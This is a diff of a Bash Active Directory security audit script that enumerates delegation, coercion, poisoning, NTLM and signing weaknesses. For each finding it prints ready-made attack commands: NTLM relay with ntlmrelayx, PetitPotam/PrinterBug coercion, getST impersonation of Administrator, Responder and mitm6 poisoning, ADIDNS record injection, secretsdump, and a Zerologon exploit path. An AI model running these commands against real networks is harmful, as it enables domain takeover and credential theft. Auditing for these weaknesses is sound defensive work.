@@ -140,7 +140,6 @@ fi
 
 # Single nxc call to cache, check user and domain
 NXC_SMB=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
-
 if echo "$NXC_SMB" | grep -qE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT_LOCKED|STATUS_ACCOUNT_DISABLED|STATUS_PASSWORD_EXPIRED"; then
   echo -e "${RED}[ERROR] Authentication failed for $AD_USER against $DC_IP${NC}"
   exit 1
@@ -234,7 +233,7 @@ fi
 
 echo ""
 
-# ADCS/PKI Vulnerability Check
+# ADCS/PKI Vulnerabilities
 if [ -x "/opt/tools/Certipy/venv/bin/certipy" ]; then
   CERTIPY_CMD="/opt/tools/Certipy/venv/bin/certipy"
 elif command -v certipy &> /dev/null; then
@@ -341,78 +340,192 @@ else
 fi
 mv "$OUTPUT_DIR"/*_Certipy.json "$OUTPUT_DIR/bloodhound/" 2>/dev/null
 
-# ADCS CA Officer check
+# ADCS/PKI Vulnerabilities - ADCS CA Officer check
 if [ ! -z "$CERTIPY_CMD" ]; then
   CA_OFFICERS_RAW=$($CERTIPY_CMD find -u "$AD_USER" -p "$PASSWORD" -dc-ip $DC_IP -target $DC_FQDN -stdout 2>/dev/null | grep -A3 "ManageCa\|ManageCertificates")
   CA_DANGEROUS=$(echo "$CA_OFFICERS_RAW" | grep -v "Domain Admins\|Enterprise Admins\|Administrators\|ManageCa\|ManageCertificates\|^--$" | grep -i "$DOMAIN" | awk '{print $NF}' | sort -u)
   if [ ! -z "$CA_DANGEROUS" ]; then
     CA_COUNT=$(echo "$CA_DANGEROUS" | wc -l)
-    echo -e "${GREY}[*] $CA_COUNT non-default ManageCA/ManageCertificates principal(s) → adcs_officers.txt${NC}"
+    echo -e "${RED}[KO] $CA_COUNT non-default ADCS Officier (ManageCA/ManageCertificates) principal(s) → adcs_officers.txt${NC}"
     echo "$CA_DANGEROUS" > "$OUTPUT_DIR/adcs_officers.txt"
   else
-    echo -e "${GREEN}[OK] ManageCA/ManageCertificates restricted to default groups${NC}"
+    echo -e "${GREEN}[OK] ADCS Officer (ManageCA/ManageCertificates) restricted${NC}"
   fi
 fi
 
-# LDAP Signing & Channel Binding
-if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
-  echo "DC,IP,LDAP_Signing,Channel_Binding" > "$OUTPUT_DIR/ldap_security_check.csv"
-  VULN_DCS=""
-  VULN_COUNT=0
-  while IFS=: read -r hostname ip; do
-    result=$(timeout 10 netexec ldap $ip -u "$AD_USER" -p "$PASSWORD" --timeout 5 2>&1)
-    signing=$(echo "$result" | grep -oP 'signing:\K\w+')
-    cb=$(echo "$result" | grep -oP 'channel binding:\K\S+')
-    if [ -z "$signing" ]; then
-      echo "$hostname,$ip,TIMEOUT,TIMEOUT" >> "$OUTPUT_DIR/ldap_security_check.csv"
-    else
-      echo "$hostname,$ip,$signing,$cb" >> "$OUTPUT_DIR/ldap_security_check.csv"
-      if [ "$signing" = "None" ] && [[ "$cb" =~ ^(No|Never) ]]; then
-        VULN_COUNT=$((VULN_COUNT + 1))
-        VULN_DCS="${VULN_DCS}${RED}       └─ ${hostname} (${ip})${NC}\n"
-      fi
-    fi
-  done < "$OUTPUT_DIR/all_dcs.txt"
-  if [ $VULN_COUNT -gt 0 ]; then
-    if [ $VULN_COUNT -eq $DC_COUNT ]; then
-      echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + Channel Binding NOT enforced → ldap_security_check.csv${NC}"
-    else
-      echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + Channel Binding → ldap_security_check.csv${NC}"
-      printf "$VULN_DCS"
-    fi
-    FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
-    if [ "$RELAY_COUNT" -gt 0 ]; then
-      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
-      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
-      echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
-    else
-      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
-    fi
-  else
-    echo -e "${GREEN}[OK] All DCs have LDAP Signing + Channel Binding enforced${NC}"
+echo ""
+
+# Unconstrained Delegation - Computer
+UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+  -b "$DOMAIN_DN" \
+  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | \
+  grep "^sAMAccountName:" | awk '{print $2}')
+
+NON_DC_UNCON=""
+dc_short=$(echo "$DC_FQDN" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
+while IFS= read -r system; do
+  [ -z "$system" ] && continue
+  system_lower=$(echo "$system" | tr '[:upper:]' '[:lower:]')
+  system_clean="${system_lower%\$}"
+  if ! echo "$DC_SAMNAMES" | grep -qx "$system_lower" && [ "$system_clean" != "$dc_short" ]; then
+    NON_DC_UNCON="${NON_DC_UNCON}${system}\n"
   fi
+done <<< "$UNCON_SYSTEMS"
+
+NON_DC_UNCON=$(echo -e "$NON_DC_UNCON" | grep -v "^$")
+NON_DC_COUNT=$(echo "$NON_DC_UNCON" | grep -v "^$" | wc -l)
+
+if [ "$NON_DC_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $NON_DC_COUNT non-DC system(s) with Unconstrained Delegation${NC}"
+  while IFS= read -r system; do
+    [ ! -z "$system" ] && echo -e "${RED}       └─ $system${NC}"
+  done <<< "$NON_DC_UNCON"
 else
-  LDAP_CHECK=$(netexec ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
-  LDAP_SIGNING=$(echo "$LDAP_CHECK" | grep -oP 'signing:\K\w+')
-  LDAP_CB=$(echo "$LDAP_CHECK" | grep -oP 'channel binding:\K\S+')
-  if [ "$LDAP_SIGNING" = "None" ] && [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
-    echo -e "${RED}[KO] LDAP Signing + Channel Binding NOT enforced${NC}"
-    if [ "$RELAY_COUNT" -gt 0 ]; then
-      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
-      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
-      echo -e "${GREY}          3) getST.py -spn cifs/${DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
-    else
-      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
-    fi
-  elif [ "$LDAP_SIGNING" = "None" ]; then
-    echo -e "${RED}[KO] LDAP Signing NOT enforced${NC}"
-    echo -e "${GREEN}       └─ Not Exploitable: Channel Binding enabled${NC}"
-  elif [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
-    echo -e "${RED}[KO] LDAP Channel Binding NOT enforced${NC}"
-    echo -e "${GREEN}       └─ Not Exploitable: LDAP Signing enabled${NC}"
-  else
-    echo -e "${GREEN}[OK] LDAP Signing + Channel Binding enforced${NC}"
+  echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
+fi
+
+# Unconstrained Delegation - User
+UNCON_USERS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+  -b "$DOMAIN_DN" \
+  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
+  sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
+
+UNCON_USER_COUNT=$(echo "$UNCON_USERS" | grep -v "^$" | wc -l)
+
+if [ "$UNCON_USER_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $UNCON_USER_COUNT user(s) with Unconstrained Delegation${NC}"
+  echo "$UNCON_USERS" | while read -r user; do
+    [ ! -z "$user" ] && echo -e "${RED}       └─ $user${NC}"
+  done
+else
+  echo -e "${GREEN}[OK] No Unconstrained Delegation on users${NC}"
+fi
+
+# Constrained Delegation
+CONSTRAINED=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+  -b "$DOMAIN_DN" \
+  "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo 2>/dev/null | grep -E "^(sAMAccountName|msDS-AllowedToDelegateTo):" | awk '/^sAMAccountName:/ {name=$2} /^msDS-AllowedToDelegateTo:/ {print name " → " $2}')
+USER_CD=$(echo "$CONSTRAINED" | grep -vE '^\S+\$ →' | grep -v "^$")
+DC_TARGET=$(echo "$CONSTRAINED" | grep -iE "→.*(${DC_HOSTNAME}|${DC_FQDN})" | grep -v "^$")
+CRITICAL_CD=$(echo -e "${USER_CD}\n${DC_TARGET}" | grep -v "^$" | sort -u)
+CRITICAL_COUNT=$(echo "$CRITICAL_CD" | grep -v "^$" | wc -l)
+if [ "$CRITICAL_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $CRITICAL_COUNT Constrained Delegation entry/entries${NC}"
+  echo "$CRITICAL_CD" | while read -r line; do
+    [ ! -z "$line" ] && echo -e "${RED}       └─ $line${NC}"
+  done
+else
+  echo -e "${GREEN}[OK] No Constrained Delegation on user accounts or DC targets${NC}"
+fi
+
+# Resource-Based Constrained Delegation (RBCD)
+RBCD_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
+RBCD_COUNT=$(echo "$RBCD_OUTPUT" | grep -v "^$" | wc -l)
+if [ "$RBCD_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $RBCD_COUNT object(s) with Resource-Based Constrained Delegation (RBCD) configured${NC}"
+  echo "$RBCD_OUTPUT" | while read -r account; do
+    [ -z "$account" ] && continue
+    echo -e "${RED}       └─ $account${NC}"
+  done
+  echo -e "${GREY}          └─ getST.py -spn cifs/$DC_FQDN \"$DOMAIN/ATTACKER\$\" -impersonate Administrator -dc-ip $DC_IP${NC}"
+else
+  echo -e "${GREEN}[OK] No Resource-Based Constrained Delegation (RBCD) configs found${NC}"
+fi
+
+# ms-DS-CreatorSID
+CREATORSID_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(ms-DS-CreatorSID=*))" sAMAccountName ms-DS-CreatorSID dNSHostName 2>/dev/null)
+CREATOR_COUNT=$(echo "$CREATORSID_OUTPUT" | grep -c "^ms-DS-CreatorSID:")
+if [ "$CREATOR_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $CREATOR_COUNT computer(s) with ms-DS-CreatorSID (RBCD risk)${NC}"
+  paste - - - < <(echo "$CREATORSID_OUTPUT" | grep -E "^(sAMAccountName|ms-DS-CreatorSID):" | awk '{print $2}') | while IFS=$'\t' read -r computer sid; do
+    [ -z "$computer" ] && continue
+    OWNER=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+      -b "$DOMAIN_DN" \
+      "(objectSid=$sid)" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' | head -1)
+    [ -z "$OWNER" ] && OWNER="UNKNOWN"
+    echo -e "${RED}       └─ $OWNER created $computer${NC}"
+  done
+else
+  echo -e "${GREEN}[OK] No ms-DS-CreatorSID entries found${NC}"
+fi
+
+echo ""
+
+# Authentication Coercion & Poisoning - Coerce Methods
+COERCE_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M coerce_plus 2>/dev/null)
+COERCE_METHODS=$(echo "$COERCE_OUTPUT" | grep "VULNERABLE," | grep -oP 'VULNERABLE, \K.*' | sort -u | tr '\n' ', ' | sed 's/,$//')
+if [ ! -z "$COERCE_METHODS" ]; then
+  echo -e "${RED}[KO] Coerce methods available on DC ($COERCE_METHODS) → coerce.txt${NC}"
+  echo "$COERCE_OUTPUT" | grep "VULNERABLE," > "$OUTPUT_DIR/coerce.txt"
+  if [ ! -z "$NON_DC_UNCON" ]; then
+    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
   fi
+  PREFERRED_ORDER=("PrinterBug" "PetitPotam" "DFSCoerce" "ShadowCoerce" "MSEven")
+    FIRST_COERCE=""
+    for method in "${PREFERRED_ORDER[@]}"; do
+      if echo "$COERCE_METHODS" | grep -q "$method"; then
+        FIRST_COERCE="$method"
+        break
+      fi
+    done
+    case "$FIRST_COERCE" in
+      PetitPotam)   echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+      PrinterBug)   echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}" ;;
+      DFSCoerce)    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+      ShadowCoerce) echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+      MSEven)       echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+    esac
+else
+  echo -e "${GREEN}[OK] No coerce methods available on DC${NC}"
+fi
+
+# Authentication Coercion & Poisoning - WPAD
+WPAD_DNS=$(nslookup wpad.$DOMAIN $DC_IP 2>&1)
+if echo "$WPAD_DNS" | grep -q "can't find"; then
+  echo -e "${RED}[KO] No WPAD DNS entry (WPAD Poisoning)${NC}"
+  echo -e "${GREY}       └─ Responder -I <IF> -wF${NC}"
+else
+  echo -e "${GREEN}[OK] WPAD DNS entry exists (no WPAD Poisoning)${NC}"
+fi
+
+# Authentication Coercion & Poisoning - IPv6 DNS
+IPV6_ENABLED=$(dig +short AAAA $DC_HOSTNAME 2>/dev/null)
+if [ -z "$IPV6_ENABLED" ]; then
+  echo -e "${RED}[KO] No IPv6 DNS record for DC (DHCPv6 Poisoning)${NC}"
+  echo -e "${GREY}       └─ mitm6 -d $DOMAIN${NC}"
+else
+  echo -e "${GREEN}[OK] IPv6 DNS configured for DC (no DHCPv6 Poisoning)${NC}"
+fi
+
+
+# Authentication Coercion & Poisoning - ADIDNS Poisoning
+ADIDNS_OUTPUT=$(dacledit.py -action read -target-dn "DC=$DOMAIN,CN=MicrosoftDNS,DC=DomainDnsZones,$DOMAIN_DN" -dc-ip $DC_IP "$FULL_USER:$PASSWORD" 2>/dev/null)
+ADIDNS_CREATECHILD=$(echo "$ADIDNS_OUTPUT" | awk '
+  /Access mask.*CreateChild/ { found=1; next }
+  found && /Trustee/ {
+    if ($0 !~ /Domain Admins|Enterprise Admins|Administrators|Local System|DnsAdmins|Enterprise Domain Controllers/) {
+      sub(/.*Trustee \(SID\)\s*:\s*/, ""); print
+    }
+    found=0
+  }
+' | sort -u)
+if [ ! -z "$ADIDNS_CREATECHILD" ]; then
+  ADIDNS_TRUSTEES=$(echo "$ADIDNS_CREATECHILD" | tr '\n' ',' | sed 's/,$//')
+  echo -e "${RED}[KO] No ADIDNS restriction for $ADIDNS_TRUSTEES (ADIDNS Poisoning)${NC}"
+  echo -e "${GREY}       └─ bloodyAD -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --host $DC_IP add dnsRecord <hostname> <YOUR_IP>${NC}"
+else
+  echo -e "${GREEN}[OK] ADIDNS zone write access is restricted (no ADIDNS Poisoning)${NC}"
+fi
+
+echo ""
+
+# NTLMv1
+NTLMV1_CHECK=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M ntlmv1 2>/dev/null)
+if echo "$NTLMV1_CHECK" | grep -qi "ntlmv1 enabled\|lmcompatibility.*[012]"; then
+  echo -e "${RED}[KO] NTLMv1 enabled on DC${NC}"
+  echo -e "${GREY}       └─ Crack with https://ntlmv1.com (rainbow tables)${NC}"
+else
+  echo -e "${GREEN}[OK] NTLMv1 disabled${NC}"
 fi
 
 # Scan scope for relay targets (exclude DCs)
@@ -442,16 +555,9 @@ if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
   done < "$OUTPUT_DIR/relay_targets_raw.txt"
   rm "$OUTPUT_DIR/relay_targets_raw.txt"
 fi
-
 RELAY_COUNT=$([ -f "$OUTPUT_DIR/relay_targets.txt" ] && wc -l < "$OUTPUT_DIR/relay_targets.txt" || echo 0)
-if [ "$RELAY_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without SMB Signing → relay_targets.txt${NC}"
-else
-  echo -e "${GREEN}[OK] All non-DC hosts in ${SUBNET}.0/24 have SMB Signing${NC}"
-  rm -f "$OUTPUT_DIR/relay_targets.txt"
-fi
 
-# SMB Signing Check on all DCs
+# NTLMv2 - SMB Signing on DCs
 if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   VULN_SMB_DCS=""
   VULN_SMB_COUNT=0  
@@ -487,17 +593,15 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
     echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/<HOST>\$@${FIRST_VULN_SMB_DC_IP}'${NC}"
     echo -e "${GREY}          4) Privileged users could dump: proxychains4 impacket-secretsdump -no-pass '${DOMAIN}/<USER>@${FIRST_VULN_SMB_DC_IP}'${NC}"
   else
-    echo -e "${GREEN}[OK] All DCs have SMB Signing required${NC}"
+    echo -e "${GREEN}[OK] SMB Signing required on all DCs${NC}"
   fi
 else
   # Fallback: single DC check
   SMB_DC_CHECK=$(netexec smb $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
   if echo "$SMB_DC_CHECK" | grep -q "signing:True"; then
-    echo -e "${GREEN}[OK] SMB Signing required on DC${NC}"
+    echo -e "${GREEN}[OK] NTLMv2 SMB Signing required on DC${NC}"
   else
-    echo -e "${RED}[KO] SMB Signing NOT required on DC${NC}"
-    
-    # Primary exploit: Non-DC relay targets
+    echo -e "${RED}[KO] NTLMv2 SMB Signing NOT required on DC${NC}"
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
       echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
@@ -514,182 +618,73 @@ else
   fi
 fi
 
-# Unconstrained Delegation Check (uses DC_SAMNAMES cached from initial DC enumeration)
-UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
-  -b "$DOMAIN_DN" \
-  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | \
-  grep "^sAMAccountName:" | awk '{print $2}')
-
-NON_DC_UNCON=""
-dc_short=$(echo "$DC_FQDN" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
-while IFS= read -r system; do
-  [ -z "$system" ] && continue
-  system_lower=$(echo "$system" | tr '[:upper:]' '[:lower:]')
-  system_clean="${system_lower%\$}"
-  if ! echo "$DC_SAMNAMES" | grep -qx "$system_lower" && [ "$system_clean" != "$dc_short" ]; then
-    NON_DC_UNCON="${NON_DC_UNCON}${system}\n"
-  fi
-done <<< "$UNCON_SYSTEMS"
-
-NON_DC_UNCON=$(echo -e "$NON_DC_UNCON" | grep -v "^$")
-NON_DC_COUNT=$(echo "$NON_DC_UNCON" | grep -v "^$" | wc -l)
-
-if [ "$NON_DC_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $NON_DC_COUNT non-DC system(s) with Unconstrained Delegation${NC}"
-  while IFS= read -r system; do
-    [ ! -z "$system" ] && echo -e "${RED}       └─ $system${NC}"
-  done <<< "$NON_DC_UNCON"
+# NTLMv2 - SMB Signing
+if [ "$RELAY_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without NTLMv2 SMB Signing → relay_targets.txt${NC}"
 else
-  echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
+  echo -e "${GREEN}[OK] NTLMv2 SMB Signing enabled on all non-DC host(s)${NC}"
+  rm -f "$OUTPUT_DIR/relay_targets.txt"
 fi
 
-# Unconstrained Delegation Check - Users
-UNCON_USERS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
-  -b "$DOMAIN_DN" \
-  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
-  sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
-
-UNCON_USER_COUNT=$(echo "$UNCON_USERS" | grep -v "^$" | wc -l)
-
-if [ "$UNCON_USER_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $UNCON_USER_COUNT user(s) with Unconstrained Delegation${NC}"
-  echo "$UNCON_USERS" | while read -r user; do
-    [ ! -z "$user" ] && echo -e "${RED}       └─ $user${NC}"
-  done
-else
-  echo -e "${GREEN}[OK] No users with Unconstrained Delegation${NC}"
-fi
-
-# Constrained Delegation Check
-CONSTRAINED=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
-  -b "$DOMAIN_DN" \
-  "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo 2>/dev/null | \
-  grep -E "^(sAMAccountName|msDS-AllowedToDelegateTo):" | \
-  awk '/^sAMAccountName:/ {name=$2} /^msDS-AllowedToDelegateTo:/ {print name " → " $2}')
-
-USER_CD=$(echo "$CONSTRAINED" | grep -vE '^\S+\$ →' | grep -v "^$")
-DC_TARGET=$(echo "$CONSTRAINED" | grep -iE "→.*(${DC_HOSTNAME}|${DC_FQDN})" | grep -v "^$")
-CRITICAL_CD=$(echo -e "${USER_CD}\n${DC_TARGET}" | grep -v "^$" | sort -u)
-CRITICAL_COUNT=$(echo "$CRITICAL_CD" | grep -v "^$" | wc -l)
-
-if [ "$CRITICAL_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $CRITICAL_COUNT critical Constrained Delegation entry/entries${NC}"
-  echo "$CRITICAL_CD" | while read -r line; do
-    [ ! -z "$line" ] && echo -e "${RED}       └─ $line${NC}"
-  done
-else
-  echo -e "${GREEN}[OK] No critical Constrained Delegation (user accounts or DC targets)${NC}"
-fi
-
-# Resource-Based Constrained Delegation (RBCD)
-RBCD_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
-RBCD_COUNT=$(echo "$RBCD_OUTPUT" | grep -v "^$" | wc -l)
-if [ "$RBCD_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $RBCD_COUNT object(s) with RBCD configured${NC}"
-  echo "$RBCD_OUTPUT" | while read -r account; do
-    [ -z "$account" ] && continue
-    echo -e "${RED}       └─ $account${NC}"
-  done
-  echo -e "${GREY}          └─ getST.py -spn cifs/$DC_FQDN \"$DOMAIN/ATTACKER\$\" -impersonate Administrator -dc-ip $DC_IP${NC}"
-else
-  echo -e "${GREEN}[OK] No RBCD configurations found${NC}"
-fi
-
-# ms-DS-CreatorSID Check
-CREATORSID_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(ms-DS-CreatorSID=*))" sAMAccountName ms-DS-CreatorSID dNSHostName 2>/dev/null)
-CREATOR_COUNT=$(echo "$CREATORSID_OUTPUT" | grep -c "^ms-DS-CreatorSID:")
-if [ "$CREATOR_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $CREATOR_COUNT computer(s) with ms-DS-CreatorSID (RBCD risk)${NC}"
-  paste - - - < <(echo "$CREATORSID_OUTPUT" | grep -E "^(sAMAccountName|ms-DS-CreatorSID):" | awk '{print $2}') | while IFS=$'\t' read -r computer sid; do
-    [ -z "$computer" ] && continue
-    OWNER=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
-      -b "$DOMAIN_DN" \
-      "(objectSid=$sid)" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' | head -1)
-    [ -z "$OWNER" ] && OWNER="UNKNOWN"
-    echo -e "${RED}       └─ $OWNER created $computer${NC}"
-  done
-else
-  echo -e "${GREEN}[OK] No ms-DS-CreatorSID entries found${NC}"
-fi
-
-echo ""
-
-# Coerce Methods (replaces separate Print Spooler + PetitPotam checks)
-COERCE_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M coerce_plus 2>/dev/null)
-COERCE_METHODS=$(echo "$COERCE_OUTPUT" | grep "VULNERABLE," | grep -oP 'VULNERABLE, \K.*' | sort -u | tr '\n' ', ' | sed 's/,$//')
-if [ ! -z "$COERCE_METHODS" ]; then
-  echo -e "${RED}[KO] Coerce methods available on DC ($COERCE_METHODS) → coerce.txt${NC}"
-  echo "$COERCE_OUTPUT" | grep "VULNERABLE," > "$OUTPUT_DIR/coerce.txt"
-  if [ ! -z "$NON_DC_UNCON" ]; then
-    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
-  fi
-  PREFERRED_ORDER=("PrinterBug" "PetitPotam" "DFSCoerce" "ShadowCoerce" "MSEven")
-    FIRST_COERCE=""
-    for method in "${PREFERRED_ORDER[@]}"; do
-      if echo "$COERCE_METHODS" | grep -q "$method"; then
-        FIRST_COERCE="$method"
-        break
+# LDAP Signing & LDAPS Channel Binding
+if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
+  echo "DC,IP,LDAP_Signing,Channel_Binding" > "$OUTPUT_DIR/ldap_security_check.csv"
+  VULN_DCS=""
+  VULN_COUNT=0
+  while IFS=: read -r hostname ip; do
+    result=$(timeout 10 netexec ldap $ip -u "$AD_USER" -p "$PASSWORD" --timeout 5 2>&1)
+    signing=$(echo "$result" | grep -oP 'signing:\K\w+')
+    cb=$(echo "$result" | grep -oP 'channel binding:\K\S+')
+    if [ -z "$signing" ]; then
+      echo "$hostname,$ip,TIMEOUT,TIMEOUT" >> "$OUTPUT_DIR/ldap_security_check.csv"
+    else
+      echo "$hostname,$ip,$signing,$cb" >> "$OUTPUT_DIR/ldap_security_check.csv"
+      if [ "$signing" = "None" ] && [[ "$cb" =~ ^(No|Never) ]]; then
+        VULN_COUNT=$((VULN_COUNT + 1))
+        VULN_DCS="${VULN_DCS}${RED}       └─ ${hostname} (${ip})${NC}\n"
       fi
-    done
-    case "$FIRST_COERCE" in
-      PetitPotam)   echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-      PrinterBug)   echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}" ;;
-      DFSCoerce)    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-      ShadowCoerce) echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-      MSEven)       echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
-    esac
-else
-  echo -e "${GREEN}[OK] No coerce methods available on DC${NC}"
-fi
-
-# Zerologon (CVE-2020-1472)
-if [ ! -z "$DC_BUILD" ] && [ "$DC_BUILD" -ge 17763 ]; then
-  echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable (Build $DC_BUILD ≥ 17763)${NC}"
-else
-  ZERO_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M zerologon 2>/dev/null)
-  if echo "$ZERO_OUTPUT" | grep -q "VULNERABLE"; then
-    echo -e "${RED}[KO] Zerologon (CVE-2020-1472) vulnerable${NC}"
-    echo -e "${GREY}       └─ /opt/tools/zerologon/venv/bin/python3 /opt/tools/zerologon/zerologon-exploit/cve-2020-1472-exploit.py $DC_HOSTNAME $DC_IP${NC}"
-  elif echo "$ZERO_OUTPUT" | grep -q "Attack failed"; then
-    echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable${NC}"
+    fi
